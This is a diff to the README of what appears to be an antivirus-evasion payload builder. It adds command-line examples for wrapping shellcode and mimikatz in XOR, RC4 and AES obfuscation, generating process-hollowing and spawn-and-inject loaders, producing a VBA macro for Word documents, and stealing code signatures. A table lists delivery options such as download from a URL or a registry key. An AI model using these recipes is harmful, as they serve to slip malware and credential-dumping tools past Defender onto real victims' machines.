@@ -38,14 +38,17 @@ options:
 # Generic Defender Bypass
 python3 staticbypass.py --obfuscator DictObfuscate --transformers XOREncrypt RC4Encrypt AESEncrypt --shellcode ~/shellcode.bin --template shellcoderunner --language cs
 
-# Process hollow in  that uses mkpivm64 to execute the shellcode in a VM then RC4 Encrypt it and strip it after compiling
-python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t shellcoderunner -l c -a strip
+# Spawn a process and inject into it using VM-based obfuscation
+python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t spawnandinject -l c -a strip
 
 # Donut an executable then AESEncrypt it and UUIDEncode it and compile it with rust
 python3 staticbypass.py -s mimikatz.exe -b donut -e AESEncrypt -t shellcoderunner -l rust
 
 # Generate a vba script that uses writes text into the word document
 python3 staticbypass.py -s ~/shellcode.bin -e DictObfuscate -a embedtext -t processhollow -l vba
+
+# Using module options example
+python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t shellcoderunner -l c -a sigthief,inputfile=bin/ResourceHacker.exe
 ```
 
 ## Roadmap
@@ -73,8 +76,8 @@ pip install -r requirements.txt
 ## Currently Implemented
 
 
-| Category      | Name            | Languages                | Description |
-|:-------------:|:---------------:|:------------------------:|:------------|
+| Category      | Name            | Languages                | Description | Options |
+|:-------------:|:---------------:|:------------------------:|:-----------:|:-------:|
 | Delivery      | embedded        | All                      | Shellcode stored within the executable |
 |               | webdelivery     | All                      | Download string, raw bytes, or list from specified URL |
 |               | regkey          | C#, PS                   | Retrieve shellcode from registry key |
